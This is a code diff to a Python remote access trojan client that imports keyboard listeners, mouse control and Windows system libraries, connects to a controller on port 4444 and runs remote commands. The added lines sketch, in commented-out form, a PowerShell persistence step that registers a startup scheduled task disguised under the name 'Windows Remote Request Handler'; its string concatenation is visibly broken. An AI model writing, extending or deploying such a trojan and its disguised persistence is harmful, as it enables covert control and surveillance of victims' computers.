@@ -10,6 +10,7 @@ import shutil
 import glob
 import ctypes
 import sys
+import os
 import webbrowser
 import re
 import pyautogui
@@ -20,6 +21,9 @@ from pynput.keyboard import Listener
 from pynput.mouse import Controller
 import time
 import keyboard
+import subprocess
+import configparser
+
 
 user32 = ctypes.WinDLL('user32')
 kernel32 = ctypes.WinDLL('kernel32')
@@ -606,5 +610,26 @@ User: {os.getlogin()}
 rat = RAT_CLIENT('127.0.0.1', 4444)
 
 if __name__ == '__main__':
+    # Use triple quotes string literal to span PowerShell command multiline
+    #STR_CMD = """
+    #$action = New-ScheduledTaskAction -Execute """ + sys.executable + """.exe -Argument """ +  + """
+    #$description = ""
+    #$settings = New-ScheduledTaskSettingsSet -RunOnlyIfNetworkAvailable
+    #$taskName = "Windows Remote Request Handler"
+    #$trigger = New-ScheduledTaskTrigger -AtStartup
+    #Register-ScheduledTask -TaskName $taskName -Description $description -Action $action -Settings $settings -Trigger $trigger | Out-Null
+    #"""
+
+    # Use a list to make it easier to pass argument to subprocess
+    #listProcess = [
+    #    "powershell.exe",
+    #    "-NoExit",
+    #    "-NoProfile",
+    #    "-Command",
+    #    STR_CMD
+    #]
+
+    # Enjoy the magic
+    #subprocess.run(listProcess, check=True)
     rat.build_connection()
     rat.execute()
